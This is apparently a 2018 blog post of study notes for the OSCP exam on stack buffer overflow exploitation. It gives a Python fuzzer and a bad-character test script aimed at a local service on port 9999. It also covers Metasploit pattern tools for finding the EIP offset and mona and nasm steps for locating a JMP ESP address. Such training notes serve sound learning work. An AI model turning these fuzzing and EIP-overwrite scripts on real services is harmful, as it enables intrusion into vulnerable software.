---
layout: post
title:  "Buffer Overflow"
date:   2018-11-08 10:00:00 +1100
categories: [buffer-overflow, offensive, security]
permalink: /:title:output_ext
comments: true
---
<br>
\-- This is by no means a guide on Buffer Overflow. It's one of my quick notes I prepared while stuyding for the OSCP exam.<br>
\-- I will spend some time on this post later to improve it and possibly add complete examples.<br>

\-- **PoC Code:**

    #!/usr/bin/python
    import socket

    Create an array of buffers, from 1 to 5900, with increments of 200.
    buffer=["A"]
    counter=100

    while len(buffer) <= 30:
        buffer.append("A"*counter)
        counter=counter+50

    for string in buffer:
        print "Fuzzing PASS with %s bytes" % len(string)
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect(('127.0.0.1',9999))
        s.recv(1024)
        s.send(string + '\r\n')
    s.close()

<br>
   
```python
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 550
```

\-- Here 550 is the length at which the program crashed)<br>
\-- Now send the payload again and this will show some value in the EIP register.

```python
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 550 -q 35724134
[*] Exact match at offset 524
```

\-- I changed the string to :  "A"*524 + "B"*4 + "C"* 28

    
    #!/usr/bin/python
    import socket

    badchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

    buffer = "A"*524 + "B"*4 + badchars

    try:
       print "Fuzzing PASS with %s bytes" % len(buffer)
       s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       connect=s.connect(('127.0.0.1',9999))
       s.recv(1024)
       s.send(buffer + '\r\n')
       s.close()
    except:
       print "Could not connect to port 9999"
       
   
**!mona modules**: (to find mp esp address) ASLR or DEP shouldn't be there and the memory range of the DLL itself does not contain bad characters, such as NULL bytes in our case.

go to "e" executable modules list. locate the dll file and double click on it. Then search for a command

    311712F3   . FFE4           JMP ESP

-- If **"jmp esp"** is not found, search for the sequence
    push esp 
    retn

\-- If the above is not found, go to modules by clicking "m"
search for "jmp esp" OP code. to find the OP code we use **nasm** and it always gives the following output.

    /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
    nasm > jmp esp
    00000000 FFE4 jmp esp

**Immunity Debugger:** ```!mona find -s "\xff\xe4" -m application.dll```

\-- Now, set the EIP address to the one found from above so that "jmp esp" can be called and execution of the program points to ESP register.<br>
\-- Make sure you enter the address in "reverse order" in the payload<br>
\-- To use EAX register and jump the first few bytes (depends on the POC code for BO)

    root@kali:~# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
    nasm > add eax,12
    00000000 83C00C add eax,byte +0xc
    nasm > jmp eax
    00000000 FFE0 jmp eax
    nasm >

<br>
\-- **EDB** (evans debugger) for linux: use plugin opcode searcher ( to search for jmp esp)


<!--### Practice:
https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/<br>
https://github.com/justinsteven/dostackbufferoverflowgood-->
